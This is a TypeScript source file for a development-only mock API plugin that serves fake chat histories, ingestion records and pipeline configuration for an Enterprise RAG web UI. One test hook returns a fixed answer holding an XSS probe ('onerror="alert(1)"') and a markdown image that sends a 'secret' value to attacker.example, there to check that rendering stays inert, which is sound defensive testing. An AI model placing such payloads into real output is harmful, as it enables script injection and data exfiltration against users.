// Copyright (C) 2024-2026 Intel Corporation
// SPDX-License-Identifier: Apache-2.0

import type { Plugin } from "vite";

// Dev-only mock backend, gated by VITE_MOCK_API=true in a gitignored
// .env.local (same pattern as VITE_SKIP_AUTH — see main.tsx). Lets `vite dev`
// serve the chat conversation view without a reachable solutions.ai backend.
// Not wired into any production or CI build path.

interface ChatHistoryEntry {
  question: string;
  answer?: string;
  metadata?: { reranked_docs?: unknown[] };
  timestamp?: string | null;
}

interface MockChat {
  id: string;
  history_name: string;
  created_at: string;
  history: ChatHistoryEntry[];
}

const now = () => new Date().toISOString();

const seedChats = (): Map<string, MockChat> => {
  const chats: MockChat[] = [
    {
      id: "mock-chat-1",
      history_name: "What is Enterprise RAG?",
      created_at: "2026-09-20T09:15:00.000Z",
      history: [
        {
          question: "What is Enterprise RAG?",
          answer:
            "Intel® AI for Enterprise RAG is a retrieval-augmented generation platform that lets you ground LLM answers in your own documents.",
          metadata: {
            reranked_docs: [
              {
                text: "Enterprise RAG combines a retriever, reranker, and LLM into a single pipeline.",
                citation_id: 1,
                type: "file",
                object_name: "enterprise-rag-overview.pdf",
                bucket_name: "mock-bucket",
                site_name: null,
                vector_distance: 0.12,
                reranker_score: 0.91,
              },
            ],
          },
          timestamp: "2026-09-20T09:15:04.000Z",
        },
      ],
    },
    {
      id: "mock-chat-2",
      history_name: "Summarize the Q3 roadmap doc",
      created_at: "2026-09-22T14:02:00.000Z",
      history: [
        {
          question: "Summarize the Q3 roadmap doc",
          answer:
            "The Q3 roadmap focuses on the shadcn/Base UI migration, WCAG AA hardening, and the component-library extraction.",
          metadata: { reranked_docs: [] },
          timestamp: "2026-09-22T14:02:03.000Z",
        },
      ],
    },
    {
      id: "mock-chat-3",
      history_name: "How do I tune retrieval for long documents?",
      created_at: "2026-09-28T10:30:00.000Z",
      history: [
        {
          question: "How do I tune retrieval for long documents?",
          answer: [
            "## Tuning retrieval for long documents",
            "",
            "Long documents usually need **smaller chunks**, a _wider_ candidate pool, and a reranker to recover precision. The defaults in this pipeline are a good starting point [1].",
            "",
            "### Recommended settings",
            "",
            "| Parameter | Default | Long documents | Why |",
            "| --- | ---: | ---: | --- |",
            "| `chunk_size` | 512 | 256 | Keeps each chunk on a single topic |",
            "| `k` | 4 | 8 | Returns more candidates to the reranker |",
            "| `fetch_k` | 20 | 50 | Widens the MMR search space |",
            "| `top_n` | 3 | 5 | Passes more context to the LLM |",
            "",
            "### Steps",
            "",
            "1. Re-ingest the documents with the smaller `chunk_size`.",
            "2. Switch `search_type` to `mmr` in the **Control Plane** retriever node.",
            "3. Raise the reranker `top_n`, then compare answers side by side.",
            "",
            "> **Note:** Changing `chunk_size` only affects newly ingested files. Existing chunks keep their original size until they are re-ingested.",
            "",
            "### Example request",
            "",
            "```bash",
            "curl -X POST https://erag.example.com/api/v1/chatqna \\",
            '  -H "Content-Type: application/json" \\',
            '  -d \'{"text": "Summarize section 4", "k": 8, "top_n": 5}\'',
            "```",
            "",
            "Things to watch:",
            "",
            "- Latency grows roughly linearly with `top_n`.",
            "- Very small chunks can split tables and code blocks apart.",
            "  - Late chunking helps keep surrounding context intact.",
            "- ~~Raising `temperature`~~ does not improve recall. Leave it low.",
            "",
            "---",
            "",
            "See the [pipeline docs](https://docs.example.com/enterprise-rag) for every tunable parameter.",
          ].join("\n"),
          metadata: {
            reranked_docs: [
              {
                text: "Retriever defaults: similarity search, k=4, fetch_k=20. MMR is recommended for long, repetitive sources.",
                citation_id: 1,
                type: "file",
                object_name: "retriever-tuning-guide.pdf",
                bucket_name: "mock-bucket-alpha",
                site_name: null,
                vector_distance: 0.09,
                reranker_score: 0.94,
              },
              {
                text: "Late chunking embeds the full document before splitting, so each chunk keeps its surrounding context.",
                citation_id: 2,
                type: "link",
                url: "https://docs.example.com/enterprise-rag",
                vector_distance: 0.14,
                reranker_score: 0.87,
              },
            ],
          },
          timestamp: "2026-09-28T10:30:05.000Z",
        },
        {
          question: "Can you give me a checklist for the rollout?",
          answer: [
            "Here is a rollout checklist:",
            "",
            "- [x] Back up the current vector store",
            "- [x] Update the retriever settings in staging",
            "- [ ] Re-ingest the **long-document** bucket",
            "- [ ] Run the evaluation set and compare the scores",
            "- [ ] Promote the settings to production",
            "",
            "Inline references: the retriever lives in `retriever-svc`, and its config key is `retriever`.",
          ].join("\n"),
          metadata: { reranked_docs: [] },
          timestamp: "2026-09-28T10:31:12.000Z",
        },
      ],
    },
  ];

  return new Map(chats.map((chat) => [chat.id, chat]));
};

const readJsonBody = (req: import("node:http").IncomingMessage) =>
  new Promise<Record<string, unknown>>((resolve, reject) => {
    let raw = "";
    req.on("data", (chunk) => (raw += chunk));
    req.on("end", () => {
      try {
        resolve(raw ? JSON.parse(raw) : {});
      } catch (error) {
        reject(error);
      }
    });
  });

const sendJson = (
  res: import("node:http").ServerResponse,
  status: number,
  body: unknown,
) => {
  res.statusCode = status;
  res.setHeader("Content-Type", "application/json");
  res.end(JSON.stringify(body));
};

// job_start_time is unix seconds; in-progress rows (status outside END_DATA_STATUSES) render a live
// elapsed duration off it in ProcessingTimePopover, so those two need a recent timestamp rather than
// a fixed one, or the popover shows a bogus multi-year duration once "now" has moved on.
const recentJobStartTime = (secondsAgo: number) =>
  Math.floor(Date.now() / 1000) - secondsAgo;

const mockFiles = [
  {
    id: "mock-file-1",
    created_at: "2026-09-20T09:00:00.000Z",
    chunk_size: 512,
    chunks_total: 12,
    chunks_processed: 12,
    status: "ingested",
    job_name: "ingest-mock-file-1",
    job_message: "",
    job_start_time: 1758358800,
    text_extractor_duration: 1.2,
    text_compression_duration: 0.3,
    text_splitter_duration: 0.4,
    dpguard_duration: 0.2,
    late_chunking_duration: 0.1,
    embedding_duration: 2.1,
    ingestion_duration: 0.6,
    processing_duration: 4.9,
    bucket_name: "mock-bucket-alpha",
    object_name: "enterprise-rag-overview.pdf",
    size: 245678,
    etag: "mock-etag-1",
    site_name: null,
    embedding_model: "bge-base-en-v1.5",
  },
  {
    id: "mock-file-2",
    created_at: "2026-09-21T11:30:00.000Z",
    chunk_size: 512,
    chunks_total: 0,
    chunks_processed: 0,
    status: "error",
    job_name: "ingest-mock-file-2",
    job_message: "Failed to extract text: corrupted PDF",
    job_start_time: 1758454200,
    text_extractor_duration: 0,
    text_compression_duration: 0,
    text_splitter_duration: 0,
    dpguard_duration: 0,
    late_chunking_duration: 0,
    embedding_duration: 0,
    ingestion_duration: 0,
    processing_duration: 0.3,
    bucket_name: "mock-bucket-beta",
    object_name: "corrupted-scan.pdf",
    size: 88213,
    etag: "mock-etag-2",
    site_name: null,
    embedding_model: null,
  },
  {
    id: "mock-file-3",
    created_at: "2026-09-24T15:45:00.000Z",
    chunk_size: 512,
    chunks_total: 8,
    chunks_processed: 3,
    status: "embedding",
    job_name: "ingest-mock-file-3",
    job_message: "",
    job_start_time: recentJobStartTime(95),
    text_extractor_duration: 0.8,
    text_compression_duration: 0.2,
    text_splitter_duration: 0.3,
    dpguard_duration: 0.1,
    late_chunking_duration: 0.1,
    embedding_duration: 1.1,
    ingestion_duration: 0,
    processing_duration: 2.6,
    bucket_name: "mock-bucket-alpha",
    object_name: "quarterly-report.docx",
    size: 512340,
    etag: "mock-etag-3",
    site_name: null,
    embedding_model: "bge-base-en-v1.5",
  },
  {
    id: "mock-file-4",
    created_at: "2026-09-25T08:10:00.000Z",
    chunk_size: 512,
    chunks_total: 5,
    chunks_processed: 5,
    status: "ingested",
    job_name: "ingest-mock-file-4",
    job_message: "",
    job_start_time: 1758787800,
    text_extractor_duration: 0.6,
    text_compression_duration: 0.1,
    text_splitter_duration: 0.2,
    dpguard_duration: 0.1,
    late_chunking_duration: 0.1,
    embedding_duration: 0.9,
    ingestion_duration: 0.3,
    processing_duration: 2.3,
    bucket_name: null,
    object_name: "product-brief.pptx",
    size: 156789,
    etag: "mock-etag-4",
    site_name: "Marketing Site",
    embedding_model: "bge-base-en-v1.5",
  },
  {
    id: "mock-file-5",
    created_at: "2026-09-25T22:00:00.000Z",
    chunk_size: 512,
    chunks_total: 0,
    chunks_processed: 0,
    status: "uploaded",
    job_name: "ingest-mock-file-5",
    job_message: "",
    job_start_time: recentJobStartTime(10),
    text_extractor_duration: 0,
    text_compression_duration: 0,
    text_splitter_duration: 0,
    dpguard_duration: 0,
    late_chunking_duration: 0,
    embedding_duration: 0,
    ingestion_duration: 0,
    processing_duration: 0,
    bucket_name: "mock-bucket-gamma",
    object_name: "new-upload.txt",
    size: 4021,
    etag: "mock-etag-5",
    site_name: null,
    embedding_model: null,
  },
];

const mockLinks = [
  {
    id: "mock-link-1",
    created_at: "2026-09-20T10:00:00.000Z",
    chunk_size: 512,
    chunks_total: 4,
    chunks_processed: 4,
    status: "ingested",
    job_name: "ingest-mock-link-1",
    job_message: "",
    job_start_time: 1758362400,
    text_extractor_duration: 0.5,
    text_compression_duration: 0.1,
    text_splitter_duration: 0.2,
    dpguard_duration: 0.1,
    late_chunking_duration: 0.1,
    embedding_duration: 0.7,
    ingestion_duration: 0.2,
    processing_duration: 1.9,
    uri: "https://docs.example.com/enterprise-rag",
    embedding_model: "bge-base-en-v1.5",
  },
  {
    id: "mock-link-2",
    created_at: "2026-09-22T13:20:00.000Z",
    chunk_size: 512,
    chunks_total: 0,
    chunks_processed: 0,
    status: "error",
    job_name: "ingest-mock-link-2",
    job_message: "Failed to fetch URL: 404 Not Found",
    job_start_time: 1758547200,
    text_extractor_duration: 0,
    text_compression_duration: 0,
    text_splitter_duration: 0,
    dpguard_duration: 0,
    late_chunking_duration: 0,
    embedding_duration: 0,
    ingestion_duration: 0,
    processing_duration: 0.2,
    uri: "https://broken.example.com/404",
    embedding_model: null,
  },
  {
    id: "mock-link-3",
    created_at: "2026-09-25T16:05:00.000Z",
    chunk_size: 512,
    chunks_total: 6,
    chunks_processed: 2,
    status: "text_splitting",
    job_name: "ingest-mock-link-3",
    job_message: "",
    job_start_time: recentJobStartTime(40),
    text_extractor_duration: 0.4,
    text_compression_duration: 0.1,
    text_splitter_duration: 0.2,
    dpguard_duration: 0,
    late_chunking_duration: 0,
    embedding_duration: 0,
    ingestion_duration: 0,
    processing_duration: 0.7,
    uri: "https://docs.example.com/roadmap",
    embedding_model: "bge-base-en-v1.5",
  },
];

// Mocks the per-key scoped fingerprint config read (GET /v1/system_fingerprint/config?params_key=...)
// that control-plane's getServicesData queryFn fans out to, one request per CONTROL_PLANE_PARAMS_KEYS
// entry — see packages/control-plane/src/store/createControlPlaneApi.ts.
const mockServiceConfigs: Record<
  string,
  {
    params_key: string;
    params_kind: string;
    version: number;
    values: Record<string, unknown>;
  }
> = {
  llm: {
    params_key: "llm",
    params_kind: "llm",
    version: 1,
    values: {
      max_new_tokens: 512,
      top_k: 10,
      top_p: 0.95,
      typical_p: 0.95,
      temperature: 0.01,
      repetition_penalty: 1.03,
      stream: true,
    },
  },
  retriever: {
    params_key: "retriever",
    params_kind: "retriever",
    version: 1,
    values: {
      search_type: "similarity",
      k: 4,
      distance_threshold: null,
      fetch_k: 20,
      lambda_mult: 0.5,
      score_threshold: 0.2,
      metadata_extraction_mode: "off",
    },
  },
  reranker: {
    params_key: "reranker",
    params_kind: "reranker",
    version: 1,
    values: {
      top_n: 3,
      rerank_score_threshold: null,
    },
  },
  prompt_template: {
    params_key: "prompt_template",
    params_kind: "prompt_template",
    version: 1,
    values: {
      user_prompt_template: "{context}\n\nQuestion: {question}",
      system_prompt_template: "You are a helpful assistant.",
    },
  },
  input_guard: {
    params_key: "input_guard",
    params_kind: "input_guard",
    version: 1,
    values: {
      input_guardrail_params: {
        prompt_injection: {
          enabled: false,
          threshold: null,
          match_type: "full",
        },
        ban_substrings: {
          enabled: false,
          substrings: null,
          match_type: "str",
          case_sensitive: false,
          redact: false,
          contains_all: false,
        },
        code: { enabled: false, threshold: null, languages: null },
        invisible_text: { enabled: false },
        regex: {
          enabled: false,
          patterns: null,
          match_type: "all",
          redact: false,
        },
        ban_topics: { enabled: false, topics: null, threshold: null },
        secrets: { enabled: false, redact_mode: "all" },
        sentiment: { enabled: false, threshold: null },
        token_limit: { enabled: false, limit: null },
        toxicity: { enabled: false, threshold: null, match_type: "full" },
      },
    },
  },
  output_guard: {
    params_key: "output_guard",
    params_kind: "output_guard",
    version: 1,
    values: {
      output_guardrail_params: {
        ban_substrings: {
          enabled: false,
          substrings: null,
          match_type: "str",
          case_sensitive: false,
          redact: false,
          contains_all: false,
        },
        code: { enabled: false, threshold: null, languages: null },
        bias: { enabled: false, threshold: null, match_type: "full" },
        relevance: { enabled: false, threshold: null },
        malicious_urls: { enabled: false, threshold: null },
      },
    },
  },
};

// Mocks GET /api/v1/chatqna/status — a GMConnector-shaped NamespaceStatus. `spec.nodes.root.steps`
// drives the graph's per-node metadata and `status.annotations` drives per-node readiness (see
// parseServiceDetails in packages/control-plane/src/utils/status.ts) — every service in
// BASE_SERVICE_NAME_NODE_ID_MAP needs a matching step + annotation pair or its node renders with no
// status at all.
const mockChatQnAStatus = {
  apiVersion: "gmc.opea.io/v1",
  kind: "GMConnector",
  metadata: {
    annotations: {},
    creationTimestamp: "2026-09-01T00:00:00.000Z",
    generation: 1,
    labels: {},
    managedFields: [],
    name: "chatqna",
    namespace: "chatqa",
    resourceVersion: "1",
    uid: "mock-uid",
  },
  spec: {
    nodes: {
      root: {
        routerType: "sequence",
        steps: [
          {
            name: "TeiEmbedding",
            internalService: {
              serviceName: "tei-embedding-svc",
              config: { EMBEDDING_MODEL_SERVER: "tei" },
            },
          },
          {
            name: "Embedding",
            internalService: { serviceName: "embedding-svc" },
          },
          {
            name: "Retriever",
            internalService: { serviceName: "retriever-svc" },
          },
          {
            name: "VectorDB",
            internalService: { serviceName: "redis-vector-db" },
          },
          {
            name: "Reranking",
            internalService: { serviceName: "reranking-svc" },
          },
          {
            name: "TeiReranking",
            internalService: {
              serviceName: "tei-reranking-svc",
              config: { RERANKING_MODEL_SERVER: "tei" },
            },
          },
          {
            name: "PromptTemplate",
            internalService: { serviceName: "prompt-template-svc" },
          },
          {
            name: "InputScan",
            internalService: { serviceName: "input-scan-svc" },
          },
          {
            name: "Llm",
            internalService: {
              serviceName: "llm-svc",
              config: { LLM_MODEL_SERVER: "vllm" },
            },
          },
          {
            name: "VllmServiceM",
            internalService: { serviceName: "vllm-service-m" },
          },
          {
            name: "OutputScan",
            internalService: { serviceName: "output-scan-svc" },
          },
        ],
      },
    },
    routerConfig: { name: "router", serviceName: "router-svc" },
  },
  status: {
    accessUrl: "",
    // Keys must contain "v1:<serviceName>" as a contiguous substring — parseServiceDetails
    // matches serviceNameNodeIdMap keys (e.g. "v1:tei-embedding-svc") via `key.includes(serviceName)`,
    // so a resource-name prefix inserted between "v1:" and the service name (e.g. "v1:chatqna-...")
    // would silently break the match and drop the node's status (and thus the node itself).
    annotations: {
      "Deployment:apps/v1:tei-embedding-svc-6b7f9c8d67-x9z2p": "Ready",
      "Deployment:apps/v1:embedding-svc-5c9d8b7a56-k3m1n": "Ready",
      "Deployment:apps/v1:retriever-svc-7a8b9c0d12-p4q5r": "Ready",
      "StatefulSet:apps/v1:redis-vector-db-0": "Ready",
      "Deployment:apps/v1:reranking-svc-4d5e6f7a89-s6t7u": "Ready",
      "Deployment:apps/v1:tei-reranking-svc-3c4d5e6f78-v8w9x": "Ready",
      "Deployment:apps/v1:prompt-template-svc-2b3c4d5e67-y0z1a": "Ready",
      "Deployment:apps/v1:input-scan-svc-1a2b3c4d56-b2c3d": "Ready",
      "Deployment:apps/v1:llm-svc-9f0a1b2c34-e4f5g": "Ready",
      "Deployment:apps/v1:vllm-service-m-8e9f0a1b23-h6i7j": "Ready",
      "Deployment:apps/v1:output-scan-svc-0d1e2f3a45-k8l9m": "Ready",
    },
    condition: {},
    status: "Ready",
  },
};

export const mockApiPlugin = (): Plugin => {
  const chats = seedChats();
  let nextId = chats.size + 1;

  return {
    name: "chatqna-mock-api",
    configureServer(server) {
      server.middlewares.use(async (req, res, next) => {
        if (!req.url) return next();
        const url = new URL(req.url, "http://localhost");

        if (url.pathname === "/v1/chat_history/get" && req.method === "GET") {
          const historyId = url.searchParams.get("history_id");

          if (historyId) {
            const chat = chats.get(historyId);
            if (!chat) return sendJson(res, 404, { error: "Not found" });
            return sendJson(res, 200, {
              historyId: chat.id,
              history: chat.history,
              historyName: chat.history_name,
            });
          }

          return sendJson(
            res,
            200,
            Array.from(chats.values()).map(
              ({ id, history_name, created_at }) => ({
                id,
                history_name,
                created_at,
              }),
            ),
          );
        }

        if (url.pathname === "/v1/chat_history/save" && req.method === "POST") {
          const body = await readJsonBody(req);
          const id = (body.id as string) ?? `mock-chat-${nextId++}`;
          const history = (body.history as ChatHistoryEntry[]) ?? [];
          const existing = chats.get(id);
          const historyName =
            existing?.history_name ?? history[0]?.question ?? "New chat";

          chats.set(id, {
            id,
            history_name: historyName,
            created_at: existing?.created_at ?? now(),
            history,
          });

          return sendJson(res, 200, {
            id,
            history_name: historyName,
            created_at: chats.get(id)!.created_at,
          });
        }

        if (
          url.pathname === "/v1/chat_history/change_name" &&
          req.method === "POST"
        ) {
          const body = await readJsonBody(req);
          const chat = chats.get(body.id as string);
          if (chat) chat.history_name = body.history_name as string;
          return sendJson(res, 200, {});
        }

        if (
          url.pathname === "/v1/chat_history/delete" &&
          req.method === "DELETE"
        ) {
          chats.delete(url.searchParams.get("history_id") ?? "");
          return sendJson(res, 200, {});
        }

        if (
          url.pathname === "/api/v1/edp/list_buckets" &&
          req.method === "GET"
        ) {
          return sendJson(res, 200, {
            buckets: [
              "mock-bucket-alpha",
              "mock-bucket-beta",
              "mock-bucket-gamma",
            ],
          });
        }

        if (url.pathname === "/api/v1/edp/files" && req.method === "GET") {
          return sendJson(res, 200, mockFiles);
        }

        if (url.pathname === "/api/v1/edp/links" && req.method === "GET") {
          return sendJson(res, 200, mockLinks);
        }

        if (
          url.pathname === "/api/v1/edp/sharepoint/sites" &&
          req.method === "GET"
        ) {
          return sendJson(res, 200, { sites: [] });
        }

        if (
          url.pathname === "/v1/system_fingerprint/config" &&
          req.method === "GET"
        ) {
          const paramsKey = url.searchParams.get("params_key");
          const config = mockServiceConfigs[paramsKey ?? ""];
          if (!config) return sendJson(res, 404, { error: "Not found" });
          return sendJson(res, 200, config);
        }

        if (url.pathname === "/api/v1/chatqna/status" && req.method === "GET") {
          return sendJson(res, 200, mockChatQnAStatus);
        }

        if (url.pathname === "/api/v1/chatqna" && req.method === "POST") {
          const body = await readJsonBody(req);
          const prompt = (body.text as string) ?? "";

          // Artificial delay so the pending/streaming UI state is actually
          // visible/screenshottable, instead of resolving instantly. A prompt
          // containing "trigger error" (case-insensitive) exercises the error
          // path instead, mapping to HTTP_ERRORS.TOO_MANY_REQUESTS in
          // transformChatErrorResponse — both dev-only test hooks, not real
          // backend behavior.
          await new Promise((resolve) => setTimeout(resolve, 1200));

          if (prompt.toLowerCase().includes("trigger error")) {
            return sendJson(res, 429, "Mock rate-limit error for dev testing.");
          }

          // A prompt containing "many sources" returns 6 sources instead of
          // 1, to exercise SourcesGrid's "Show all/less sources" affordance
          // (only appears past 3) — another dev-only test hook.
          if (prompt.toLowerCase().includes("many sources")) {
            return sendJson(res, 200, {
              text: `Mock answer to: "${prompt}"`,
              json: {
                reranked_docs: Array.from({ length: 6 }, (_, i) => ({
                  text: `Mocked source document number ${i + 1}, used to test the show-more affordance.`,
                  citation_id: i + 1,
                  type: "file" as const,
                  object_name: `mock-source-${i + 1}.pdf`,
                  bucket_name: "mock-bucket",
                  site_name: null,
                  vector_distance: 0.1 + i * 0.05,
                  reranker_score: 0.95 - i * 0.05,
                })),
              },
            });
          }

          // A prompt containing "markdown sample" returns a fixed answer with
          // code, raw HTML and a remote image, to check that code renders and
          // copies verbatim while raw HTML/images stay inert — dev-only hook.
          if (prompt.toLowerCase().includes("markdown sample")) {
            return sendJson(res, 200, {
              text: [
                "Inline code: `a -> b` and `<vector>`.",
                "",
                "```",
                "f(X) -> X.",
                "g(Y) <- Y.",
                "```",
                "",
                "```cpp",
                "#include <vector>",
                "int main() { return 0; }",
                "```",
                "",
                "```php",
                "<?php echo 1; ?>",
                "```",
                "",
                '<b>raw bold</b> <img src=x onerror="alert(1)">',
                "",
                "![leak](https://attacker.example/?q=secret)",
              ].join("\n"),
              json: { reranked_docs: [] },
            });
          }

          return sendJson(res, 200, {
            text: `Mock answer to: "${prompt}"`,
            json: {
              reranked_docs: [
                {
                  text: "This is a mocked source document used for local dev without a real backend.",
                  citation_id: 1,
                  type: "file",
                  object_name: "mock-answer-source.pdf",
                  bucket_name: "mock-bucket",
                  site_name: null,
                  vector_distance: 0.1,
                  reranker_score: 0.95,
                },
              ],
            },
          });
        }

        next();
      });
    },
  };
};
